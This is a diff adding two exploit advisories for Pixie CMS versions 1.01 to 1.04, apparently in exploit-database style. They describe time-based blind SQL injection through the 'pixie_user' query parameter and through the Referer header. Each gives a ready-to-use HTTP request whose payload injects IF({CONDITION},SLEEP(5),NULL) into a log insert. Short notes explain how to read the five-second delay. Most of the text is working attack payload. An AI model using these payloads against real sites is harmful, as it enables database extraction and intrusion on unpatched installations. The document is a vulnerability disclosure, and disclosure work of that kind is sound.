@@ -1,0 +1,37 @@
+Exploit Title: Pixie CMS 1.01 - 1.04 "pixie_user" Blind SQL Injection
+Google Dork: None
+Date: 11/14/2011
+Author: Piranha, piranha[at]torontomail.com
+Software Link: http://www.getpixie.co.uk/
+Version: 1.01 - 1.04
+Tested on: Windows XP SP3, Pixie versions: 1.01 - 1.04
+CVE : None
+
+Example request:
+GET http://localhost:8080/pixie_v1.04/?pixie_user=x',log_important=IF({CONDITION},SLEEP(5),NULL),log_id='1234
+Host: localhost:8080
+Referer: http://www.google.com/
+Pragma: no-cache
+Cache-Control: no-cache
+Connection: Keep-Alive
+
+If the condition is true then you have a response with timeout ~5 seconds. Notice that referer is required.
+
+Exploit Title: Pixie CMS 1.01 - 1.04 "Referer" Blind SQL Injection
+Google Dork: None
+Date: 11/14/2011
+Author: Piranha
+Software Link: http://www.getpixie.co.uk/
+Version: 1.01 - 1.04
+Tested on: Windows XP SP3, Pixie versions: 1.01 - 1.04
+CVE : None
+
+Example request:
+GET http://localhost:8080/pixie_v1.04/
+Host: localhost:8080
+Referer: http://www.google.com',log_important=IF({CONDITION},SLEEP(5),NULL),log_id='1234
+Pragma: no-cache
+Cache-Control: no-cache
+Connection: Keep-Alive
+
+If the condition is true then you have a response with timeout ~5 seconds.
